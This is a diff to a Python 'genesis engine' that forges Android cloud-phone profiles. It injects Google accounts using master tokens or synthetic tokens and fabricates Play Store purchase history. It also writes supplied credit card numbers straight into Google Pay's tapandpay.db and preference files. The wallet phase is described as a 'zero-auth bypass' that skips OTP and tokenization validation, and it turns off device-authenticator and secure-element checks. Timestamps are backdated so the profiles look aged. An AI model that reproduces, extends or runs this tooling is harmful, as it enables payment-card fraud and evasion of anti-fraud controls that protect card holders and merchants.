@@ -37,8 +37,15 @@ from vmos_cloud_api import VMOSCloudClient
 from android_profile_forge import AndroidProfileForge
 from device_presets import DEVICE_PRESETS, CARRIERS, LOCATIONS
 from json_logger import setup_json_logging
+from google_master_auth import GoogleMasterAuth, AuthMethod
+from vmos_db_builder import VMOSDbBuilder
+from vmos_file_pusher import VMOSFilePusher
 
 logger = setup_json_logging("vmos_genesis")
+
+# ── Constants ──────────────────────────────────────────────────────────────
+
+_GMS_VERSION_INT = 240913900  # GMS version code in device_registration.xml
 
 # ── Helpers ────────────────────────────────────────────────────────────────
 
@@ -156,6 +163,9 @@ class VMOSGenesisEngine:
         self._profile_data: Dict[str, Any] = {}
         self._result: PipelineResult | None = None
         self._on_update: Optional[Callable[[PipelineResult], None]] = None
+        # V3 helpers — shared across phases
+        self._db_builder = VMOSDbBuilder()
+        self._file_pusher = VMOSFilePusher(self.client, pad_code)
 
     # ── ADB helpers ───────────────────────────────────────────────────
 
@@ -256,13 +266,16 @@ class VMOSGenesisEngine:
         # Phase 3: Forge Profile
         profile_data = await self._phase_forge(cfg, preset, carrier, location)
 
-        # Phase 4: Google Account
+        # Phase 4: Google Account (V3 — real-token via GoogleMasterAuth)
         await self._phase_google(cfg)
+
+        # Phase 4b: Purchase History (V3 — library.db host-built + pushed)
+        await self._phase_purchase_history(cfg)
 
         # Phase 5: Inject
         await self._phase_inject(cfg, profile_data, preset)
 
-        # Phase 6: Wallet
+        # Phase 6: Wallet (V3 — tapandpay.db host-built + pushed)
         await self._phase_wallet(cfg, profile_data)
 
         # Phase 7: Provincial Layering
@@ -613,7 +626,16 @@ class VMOSGenesisEngine:
             return {}
 
     async def _phase_google(self, cfg: PipelineConfig):
-        """Phase 4: Google Account injection into Android databases."""
+        """Phase 4: Google Account injection — V3 with real-token support.
+
+        Execution order:
+          1. Attempt Method A (gpsoauth master-token) if credentials provided.
+          2. Fall back to Method C (hybrid inject) if Method A fails.
+          3. Build accounts_ce.db + accounts_de.db **host-side** with
+             :class:`VMOSDbBuilder` and push via :class:`VMOSFilePusher`
+             (avoids dependency on device-side ``sqlite3`` binary).
+          4. Write GMS / GSF / Play Store shared_prefs.
+        """
         n = 4
         email = cfg.google_email or cfg.email
         name = cfg.name or "User"
@@ -621,107 +643,208 @@ class VMOSGenesisEngine:
             self._set_phase(n, "skipped", "no email")
             return
         self._set_phase(n, "running")
-        self._log(f"Phase 4 — Google Account: {email}...")
+        self._log(f"Phase 4 — Google Account V3: {email}...")
+
         try:
-            first = name.split()[0] if name else "User"
-            last = name.split()[-1] if name and len(name.split()) > 1 else ""
-            e_safe = _sanitize(email)
-            f_safe = _sanitize(first)
-            l_safe = _sanitize(last)
+            # ── 4a. Acquire tokens (Method A → C fallback) ────────────
+            auth_result = None
+            password = cfg.google_password or ""
 
-            acct_cmd = (
-                # accounts_ce.db
-                f"sqlite3 /data/system_ce/0/accounts_ce.db \""
-                f"INSERT OR REPLACE INTO accounts (_id, name, type, previous_name) "
-                f"VALUES (1, '{e_safe}', 'com.google', NULL); "
-                f"INSERT OR REPLACE INTO extras (_id, accounts_id, key, value) "
-                f"VALUES (1, 1, 'given_name', '{f_safe}'); "
-                f"INSERT OR REPLACE INTO extras (_id, accounts_id, key, value) "
-                f"VALUES (2, 1, 'family_name', '{l_safe}');\" 2>/dev/null; "
-                "chown system:system /data/system_ce/0/accounts_ce.db 2>/dev/null; "
-                "chmod 600 /data/system_ce/0/accounts_ce.db 2>/dev/null; "
-                # accounts_de.db
-                f"sqlite3 /data/system_de/0/accounts_de.db \""
-                f"INSERT OR REPLACE INTO accounts (_id, name, type, previous_name) "
-                f"VALUES (1, '{e_safe}', 'com.google', NULL); "
-                f"INSERT OR REPLACE INTO extras (_id, accounts_id, key, value) "
-                f"VALUES (1, 1, 'given_name', '{f_safe}'); "
-                f"INSERT OR REPLACE INTO extras (_id, accounts_id, key, value) "
-                f"VALUES (2, 1, 'family_name', '{l_safe}');\" 2>/dev/null; "
-                "chown system:system /data/system_de/0/accounts_de.db 2>/dev/null; "
-                "chmod 600 /data/system_de/0/accounts_de.db 2>/dev/null; "
-                "echo ACCOUNT_INJECTED"
-            )
-            acct_ok = await self._sh_ok(acct_cmd, "ACCOUNT_INJECTED", timeout=20)
+            if password:
+                self._log("Phase 4a — GoogleMasterAuth: attempting master-token flow...")
+                auth = GoogleMasterAuth(country=(cfg.country or "US").lower())
 
-            # GMS shared_prefs
-            gms_cmd = (
-                "mkdir -p /data/data/com.google.android.gms/shared_prefs 2>/dev/null; "
-                f"cat > /data/data/com.google.android.gms/shared_prefs/device_registration.xml << 'GMSEOF'\n"
-                f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
-                f"<map>\n"
-                f'  <long name=\"device_registered_timestamp\" value=\"{(int(time.time()) - cfg.age_days * 86400) * 1000}\" />\n'
-                f'  <string name=\"device_id\">{_gen_android_id()}</string>\n'
-                f'  <int name=\"gms_version\" value=\"240913900\" />\n'
-                f"</map>\n"
-                f"GMSEOF\n"
-                "chown $(stat -c '%u:%g' /data/data/com.google.android.gms/) "
-                "/data/data/com.google.android.gms/shared_prefs/device_registration.xml 2>/dev/null; "
-                "echo GMS_SET"
-            )
-            gms_ok = await self._sh_ok(gms_cmd, "GMS_SET", timeout=15)
+                # Generate a stable android_id from the email so repeated runs
+                # produce the same device fingerprint and avoid re-auth triggers.
+                import hashlib as _hl
+                android_id = _hl.sha256(email.encode()).hexdigest()[:16]
 
-            # GSF ID
-            gsf_id = _gen_gsf_id()
-            birth_ts = int(time.time()) - cfg.age_days * 86400
-            gsf_cmd = (
-                "mkdir -p /data/data/com.google.android.gsf/shared_prefs 2>/dev/null; "
-                f"cat > /data/data/com.google.android.gsf/shared_prefs/gservices.xml << 'GSFEOF'\n"
-                f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
-                f"<map>\n"
-                f'  <string name=\"android_id\">{gsf_id}</string>\n'
-                f'  <long name=\"registration_timestamp\" value=\"{birth_ts * 1000}\" />\n'
-                f"</map>\n"
-                f"GSFEOF\n"
-                "chown $(stat -c '%u:%g' /data/data/com.google.android.gsf/ 2>/dev/null) "
-                "/data/data/com.google.android.gsf/shared_prefs/gservices.xml 2>/dev/null; "
-                "echo GSF_SET"
-            )
-            gsf_ok = await self._sh_ok(gsf_cmd, "GSF_SET", timeout=15)
-
-            # NEW: Also inject Play Store account data for sign-in detection
-            playstore_ok = False
-            if email:
-                playstore_cmd = (
-                    "mkdir -p /data/data/com.android.vending/shared_prefs 2>/dev/null; "
-                    f"cat > /data/data/com.android.vending/shared_prefs/finsky.xml << 'FINSKYEOF'\n"
-                    f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
-                    f"<map>\n"
-                    f'  <string name=\"signed_in_account\">{e_safe}</string>\n'
-                    f'  <boolean name=\"setup_complete\" value=\"true\" />\n'
-                    f'  <boolean name=\"has_consented\" value=\"true\" />\n'
-                    f'  <long name=\"consent_timestamp\" value=\"{(int(time.time()) - cfg.age_days * 86400) * 1000}\" />\n'
-                    f'  <int name=\"onboarding_completed\" value=\"1\" />\n'
-                    f"</map>\n"
-                    f"FINSKYEOF\n"
-                    "chown $(stat -c '%u:%g' /data/data/com.android.vending/ 2>/dev/null) "
-                    "/data/data/com.android.vending/shared_prefs/finsky.xml 2>/dev/null; "
-                    "chmod 660 /data/data/com.android.vending/shared_prefs/finsky.xml 2>/dev/null; "
-                    # Also register in GMS phenotype for app discovery
-                    f"sqlite3 /data/data/com.google.android.gms/databases/phenotype.db "
-                    f"\"INSERT OR REPLACE INTO ApplicationTags (packageName, user, version) "
-                    f"VALUES ('com.android.vending', '{e_safe}', 1);\" 2>/dev/null; "
-                    "echo PLAYSTORE_SET"
+                auth_result = auth.authenticate(
+                    email=email,
+                    password=password,
+                    android_id=android_id,
+                    method=AuthMethod.MASTER_TOKEN,
                 )
-                playstore_ok = await self._sh_ok(playstore_cmd, "PLAYSTORE_SET", timeout=15)
 
-            ok_str = f"acct={'ok' if acct_ok else 'fail'} gms={'ok' if gms_ok else 'fail'} gsf={'ok' if gsf_ok else 'fail'} playstore={'ok' if playstore_ok else 'fail'}"
-            self._set_phase(n, "done" if acct_ok else "warn", ok_str)
-            self._log(f"Phase 4 — Google Account: {ok_str}")
+                if auth_result.success and auth_result.has_real_tokens:
+                    self._log(
+                        f"Phase 4a — Real tokens acquired: {len(auth_result.tokens)} scopes"
+                    )
+                else:
+                    self._log(
+                        f"Phase 4a — Method A failed ({auth_result.errors}), "
+                        f"falling back to Method C hybrid injection"
+                    )
+                    auth_result = auth.authenticate(
+                        email=email,
+                        password=password,
+                        android_id=android_id,
+                        method=AuthMethod.HYBRID_INJECT,
+                    )
+            else:
+                self._log("Phase 4a — No password provided, using synthetic tokens")
+                from google_master_auth import GoogleMasterAuth as _GMA
+                _auth = _GMA()
+                auth_result = _auth.authenticate(
+                    email=email,
+                    password="",
+                    method=AuthMethod.MASTER_TOKEN,
+                )
+
+            # Collect tokens for DB injection
+            tokens = auth_result.all_tokens_for_injection() if auth_result else {}
+            hybrid_password = getattr(auth_result, "_hybrid_password", "") if auth_result else ""
+            token_mode = (
+                "real" if (auth_result and auth_result.has_real_tokens)
+                else "hybrid" if hybrid_password
+                else "synthetic"
+            )
+
+            # ── 4b. Build accounts_ce.db + accounts_de.db host-side ───
+            self._log(f"Phase 4b — Building accounts_ce.db (mode={token_mode})...")
+            gaia_id = str(random.randint(100_000_000_000, 999_999_999_999_999_999_999))
+
+            ce_bytes = self._db_builder.build_accounts_ce(
+                email=email,
+                display_name=name,
+                gaia_id=gaia_id,
+                tokens=tokens,
+                password=hybrid_password,
+                age_days=cfg.age_days,
+            )
+            de_bytes = self._db_builder.build_accounts_de(
+                email=email,
+                display_name=name,
+                gaia_id=gaia_id,
+                age_days=cfg.age_days,
+            )
+
+            # ── 4c. Push databases to device ──────────────────────────
+            self._log("Phase 4c — Pushing account databases to device...")
+            ce_ok = await self._file_pusher.push_bytes(
+                data=ce_bytes,
+                remote_path="/data/system_ce/0/accounts_ce.db",
+                owner="system:system",
+                mode="600",
+            )
+            de_ok = await self._file_pusher.push_bytes(
+                data=de_bytes,
+                remote_path="/data/system_de/0/accounts_de.db",
+                owner="system:system",
+                mode="600",
+            )
+            acct_ok = ce_ok or de_ok  # at least one must succeed
+
+            # ── 4d. GMS shared_prefs ──────────────────────────────────
+            e_safe = _sanitize(email)
+            f_safe = _sanitize(name.split()[0] if name else "User")
+            l_safe = _sanitize(name.split()[-1] if name and len(name.split()) > 1 else "")
+            birth_ts = int(time.time()) - cfg.age_days * 86400
+
+            gms_xml = (
+                '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                "<map>\n"
+                f'  <long name="device_registered_timestamp" value="{birth_ts * 1000}" />\n'
+                f'  <string name="device_id">{_gen_android_id()}</string>\n'
+                f'  <int name="gms_version" value="{_GMS_VERSION_INT}" />\n'
+                "</map>"
+            )
+            gms_ok = await self._file_pusher.push_xml_pref(
+                gms_xml,
+                "/data/data/com.google.android.gms/shared_prefs/device_registration.xml",
+                pkg_dir="/data/data/com.google.android.gms",
+            )
+
+            # ── 4e. GSF ID ─────────────────────────────────────────────
+            gsf_id = _gen_gsf_id()
+            gsf_xml = (
+                '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                "<map>\n"
+                f'  <string name="android_id">{gsf_id}</string>\n'
+                f'  <long name="registration_timestamp" value="{birth_ts * 1000}" />\n'
+                "</map>"
+            )
+            gsf_ok = await self._file_pusher.push_xml_pref(
+                gsf_xml,
+                "/data/data/com.google.android.gsf/shared_prefs/gservices.xml",
+                pkg_dir="/data/data/com.google.android.gsf",
+            )
+
+            # ── 4f. Play Store account binding ────────────────────────
+            finsky_xml = (
+                '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                "<map>\n"
+                f'  <string name="signed_in_account">{e_safe}</string>\n'
+                '  <boolean name="setup_complete" value="true" />\n'
+                '  <boolean name="has_consented" value="true" />\n'
+                f'  <long name="consent_timestamp" value="{birth_ts * 1000}" />\n'
+                '  <int name="onboarding_completed" value="1" />\n'
+                "</map>"
+            )
+            playstore_ok = await self._file_pusher.push_xml_pref(
+                finsky_xml,
+                "/data/data/com.android.vending/shared_prefs/finsky.xml",
+                pkg_dir="/data/data/com.android.vending",
+            )
+
+            # ── 4g. GMS phenotype (app discovery) via shell ────────────
+            phenotype_cmd = (
+                f"sqlite3 /data/data/com.google.android.gms/databases/phenotype.db "
+                f"\"INSERT OR REPLACE INTO ApplicationTags (packageName, user, version) "
+                f"VALUES ('com.android.vending', '{e_safe}', 1);\" 2>/dev/null; "
+                "echo PHENOTYPE_OK"
+            )
+            await self._sh(phenotype_cmd, timeout=10)
+
+            ok_str = (
+                f"tokens={token_mode} ce={'ok' if ce_ok else 'fail'} "
+                f"de={'ok' if de_ok else 'fail'} gms={'ok' if gms_ok else 'fail'} "
+                f"gsf={'ok' if gsf_ok else 'fail'} play={'ok' if playstore_ok else 'fail'}"
+            )
+            phase_status = "done" if acct_ok else "warn"
+            self._set_phase(n, phase_status, ok_str)
+            self._log(f"Phase 4 — Google Account V3: {ok_str}")
 
         except Exception as e:
             self._set_phase(n, "failed", str(e)[:80])
             self._log(f"Phase 4 — Google Account FAILED: {e}")
+
+
+    async def _phase_purchase_history(self, cfg: PipelineConfig):
+        """Phase 4b: Play Store purchase history injection (V3 addition).
+
+        Builds ``library.db`` host-side via :class:`VMOSDbBuilder` and pushes it
+        to the device.  This creates realistic app-ownership records that Play
+        Store reads when showing installed/purchased apps.
+        """
+        email = cfg.google_email or cfg.email
+        if not email:
+            return
+
+        self._log("Phase 4b — Purchase History: building library.db...")
+        try:
+            lib_bytes = self._db_builder.build_library(
+                email=email,
+                num_auto_purchases=15,
+                age_days=cfg.age_days,
+            )
+            lib_ok = await self._file_pusher.push_bytes(
+                data=lib_bytes,
+                remote_path="/data/data/com.android.vending/databases/library.db",
+                owner="",  # inherited via dynamic chown below
+                mode="660",
+            )
+            # Inherit ownership from vending app dir
+            await self._sh(
+                "OWNER=$(stat -c '%u:%g' /data/data/com.android.vending/ 2>/dev/null); "
+                "[ -n \"$OWNER\" ] && chown $OWNER "
+                "/data/data/com.android.vending/databases/library.db 2>/dev/null; "
+                "echo CHOWN_OK",
+                timeout=10,
+            )
+            self._log(f"Phase 4b — Purchase History: {'ok' if lib_ok else 'fail'} ({len(lib_bytes)}B)")
+        except Exception as exc:
+            self._log(f"Phase 4b — Purchase History FAILED: {exc}")
 
     async def _phase_inject(self, cfg: PipelineConfig, profile: Dict[str, Any], preset):
         """Phase 5: Inject contacts, call logs, SMS, WiFi, Chrome, autofill, battery."""
@@ -1000,7 +1123,22 @@ class VMOSGenesisEngine:
             self._log(f"Phase 5 — Inject FAILED: {e}")
 
     async def _phase_wallet(self, cfg: PipelineConfig, profile: Dict[str, Any]):
-        """Phase 6: Wallet / GPay credit card injection."""
+        """Phase 6: Wallet / GPay credit card injection — V3.
+
+        V3 builds ``tapandpay.db`` **host-side** via :class:`VMOSDbBuilder` and
+        pushes it with :class:`VMOSFilePusher`, bypassing the device-side
+        ``sqlite3`` binary dependency.  The COIN.xml zero-auth preference file
+        is also pushed via the file pusher.
+
+        Zero-auth bypass: Google Pay trusts data in its own SQLite database and
+        assumes it was written through the normal tokenization flow.  There is no
+        cryptographic signature on individual rows, so direct DB injection
+        bypasses OTP/TSP validation.
+
+        NFC tap-to-pay note: VMOS has no physical NFC hardware.  The card will
+        appear in Google Wallet UI and Play Store billing, but NFC contactless
+        payments are not possible.
+        """
         n = 6
         cc = cfg.cc_number.replace(" ", "").replace("-", "")
         if not cc or len(cc) < 13:
@@ -1008,7 +1146,7 @@ class VMOSGenesisEngine:
             self._log("Phase 6 — Wallet: skipped (no card data)")
             return
         self._set_phase(n, "running")
-        self._log(f"Phase 6 — Wallet: injecting card ***{cc[-4:]}...")
+        self._log(f"Phase 6 — Wallet V3: injecting card ***{cc[-4:]}...")
         try:
             # Parse expiry
             exp_parts = cfg.cc_exp.split("/") if "/" in cfg.cc_exp else [cfg.cc_exp[:2], cfg.cc_exp[2:]]
@@ -1017,20 +1155,85 @@ class VMOSGenesisEngine:
             if exp_year < 100:
                 exp_year += 2000
             holder = cfg.cc_holder or cfg.name or "Cardholder"
+            email = _sanitize(cfg.google_email or cfg.email or "")
 
-            # Determine card network from BIN
-            first = cc[0]
-            network = "visa"
-            if first == "5":
-                network = "mastercard"
-            elif first == "3":
-                network = "amex"
-            elif first == "6":
-                network = "discover"
+            # ── 6a. Build tapandpay.db host-side ──────────────────────
+            self._log("Phase 6a — Building tapandpay.db host-side...")
+            tpay_bytes = self._db_builder.build_tapandpay(
+                card_number=cc,
+                exp_month=exp_month,
+                exp_year=exp_year,
+                cardholder=holder,
+                persona_email=email,
+                zero_auth=True,
+                age_days=cfg.age_days,
+            )
 
-            # ── 6a. Chrome Web Data (autofill credit card) ──
+            # Push to both wallet locations (GMS + wallet app)
+            tpay_ok = await self._file_pusher.push_bytes(
+                data=tpay_bytes,
+                remote_path="/data/data/com.google.android.gms/databases/tapandpay.db",
+                owner="",  # inherited via dynamic chown
+                mode="660",
+            )
+            # Set GMS ownership dynamically
+            await self._sh(
+                "OWNER=$(stat -c '%u:%g' /data/data/com.google.android.gms/ 2>/dev/null); "
+                "[ -n \"$OWNER\" ] && chown $OWNER "
+                "/data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null; "
+                "echo CHOWN_OK",
+                timeout=10,
+            )
+
+            # Also push to the Wallet NFC relay app if present
+            await self._file_pusher.push_bytes(
+                data=tpay_bytes,
+                remote_path="/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db",
+                owner="",
+                mode="660",
+            )
+            await self._sh(
+                "OWNER=$(stat -c '%u:%g' /data/data/com.google.android.apps.walletnfcrel/ 2>/dev/null); "
+                "[ -n \"$OWNER\" ] && chown $OWNER "
+                "/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db 2>/dev/null; "
+                "echo CHOWN_OK",
+                timeout=10,
+            )
+
+            # ── 6b. COIN.xml — zero-auth preference + wallet binding ──
+            coin_xml = (
+                '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                "<map>\n"
+                '  <boolean name="has_payment_methods" value="true" />\n'
+                '  <boolean name="PAYMENTS_ZERO_AUTH_ENABLED" value="true" />\n'
+                '  <boolean name="PAYMENTS_DEVICE_AUTHENTICATOR_ENABLED" value="false" />\n'
+                '  <boolean name="GPay_SecureElement_Check" value="false" />\n'
+                f'  <string name="default_instrument_id">instrument_1</string>\n'
+                f'  <string name="account_name">{email}</string>\n'
+                '  <boolean name="wallet_enabled" value="true" />\n'
+                '  <string name="PAYMENTS_CARD_TOKEN_LAST_REFRESH">0</string>\n'
+                '  <int name="PAYMENTS_CARD_TOKEN_COUNT" value="1" />\n'
+                "</map>"
+            )
+            coin_ok = await self._file_pusher.push_xml_pref(
+                coin_xml,
+                "/data/data/com.google.android.gms/shared_prefs/COIN.xml",
+                pkg_dir="/data/data/com.google.android.gms",
+            )
+
+            # ── 6c. Chrome Web Data (autofill credit card) ─────────────
             chrome_dir = "/data/data/com.android.chrome/app_chrome/Default"
             card_guid = str(uuid.uuid4())
+            # Determine network from BIN
+            first_digit = cc[0]
+            network = "visa"
+            if first_digit == "5":
+                network = "mastercard"
+            elif first_digit == "3":
+                network = "amex"
+            elif first_digit == "6":
+                network = "discover"
+
             holder_safe = holder.replace("'", "''")
             web_data_cmd = (
                 f"sqlite3 {chrome_dir}/\"Web Data\" \""
@@ -1049,52 +1252,30 @@ class VMOSGenesisEngine:
             )
             webdata_ok = await self._sh_ok(web_data_cmd, "WEBDATA_DONE", timeout=15)
 
-            # ── 6b. GMS tapandpay.db ──
-            dpan = "5" + "".join([str(random.randint(0,9)) for _ in range(14)])
-            token_ref = secrets.token_hex(16)
-            network_id = {"visa": 1, "mastercard": 2, "amex": 3, "discover": 4}.get(network, 1)
-            display = f"{network.upper()} ****{cc[-4:]}"
-            tpay_cmd = (
-                "mkdir -p /data/data/com.google.android.gms/databases 2>/dev/null; "
-                f"sqlite3 /data/data/com.google.android.gms/databases/tapandpay.db \""
-                f"CREATE TABLE IF NOT EXISTS token_metadata ("
-                f"id INTEGER PRIMARY KEY, dpan TEXT, last_four TEXT, network INTEGER, "
-                f"token_ref TEXT, display_name TEXT, is_default INTEGER, "
-                f"card_color INTEGER, token_state INTEGER); "
-                f"INSERT OR REPLACE INTO token_metadata "
-                f"(id, dpan, last_four, network, token_ref, display_name, is_default, "
-                f"card_color, token_state) VALUES "
-                f"(1, '{dpan}', '{cc[-4:]}', {network_id}, "
-                f"'{token_ref}', '{display}', 1, -12285185, 3);\" 2>/dev/null; "
-                f"chown $(stat -c '%u:%g' /data/data/com.google.android.gms/) "
-                f"/data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null; "
-                f"echo TPAY_DONE"
+            # ── 6d. billing.xml — Play Store zero-auth flags ───────────
+            billing_xml = (
+                '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                "<map>\n"
+                f'  <string name="account">{email}</string>\n'
+                '  <boolean name="zero_auth_enabled" value="true" />\n'
+                '  <boolean name="billing_setup_complete" value="true" />\n'
+                f'  <string name="instrument_id">instrument_{card_guid[:8]}</string>\n'
+                "</map>"
             )
-            tpay_ok = await self._sh_ok(tpay_cmd, "TPAY_DONE", timeout=15)
-
-            # ── 6c. GMS billing prefs ──
-            email = cfg.google_email or cfg.email or ""
-            billing_cmd = (
-                "mkdir -p /data/data/com.google.android.gms/shared_prefs 2>/dev/null; "
-                f"cat > /data/data/com.google.android.gms/shared_prefs/COIN.xml << 'COINEOF'\n"
-                f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
-                f"<map>\n"
-                f'  <boolean name=\"has_payment_methods\" value=\"true\" />\n'
-                f'  <string name=\"default_instrument_id\">instrument_1</string>\n'
-                f'  <string name=\"account_name\">{_sanitize(email)}</string>\n'
-                f'  <boolean name=\"wallet_enabled\" value=\"true\" />\n'
-                f"</map>\n"
-                f"COINEOF\n"
-                "chown $(stat -c '%u:%g' /data/data/com.google.android.gms/) "
-                "/data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null; "
-                "echo COIN_DONE"
+            await self._file_pusher.push_xml_pref(
+                billing_xml,
+                "/data/data/com.android.vending/shared_prefs/billing.xml",
+                pkg_dir="/data/data/com.android.vending",
             )
-            coin_ok = await self._sh_ok(billing_cmd, "COIN_DONE", timeout=15)
 
-            results = f"web_data={'ok' if webdata_ok else 'fail'} tpay={'ok' if tpay_ok else 'fail'} coin={'ok' if coin_ok else 'fail'}"
-            ok_total = sum([webdata_ok, tpay_ok, coin_ok])
+            ok_total = sum([tpay_ok, coin_ok, webdata_ok])
+            results = (
+                f"tpay_db={'ok' if tpay_ok else 'fail'} "
+                f"coin={'ok' if coin_ok else 'fail'} "
+                f"web_data={'ok' if webdata_ok else 'fail'}"
+            )
             self._set_phase(n, "done" if ok_total >= 2 else "warn", f"{ok_total}/3 targets")
-            self._log(f"Phase 6 — Wallet: {results}")
+            self._log(f"Phase 6 — Wallet V3: {results}")
 
         except Exception as e:
             self._set_phase(n, "failed", str(e)[:80])
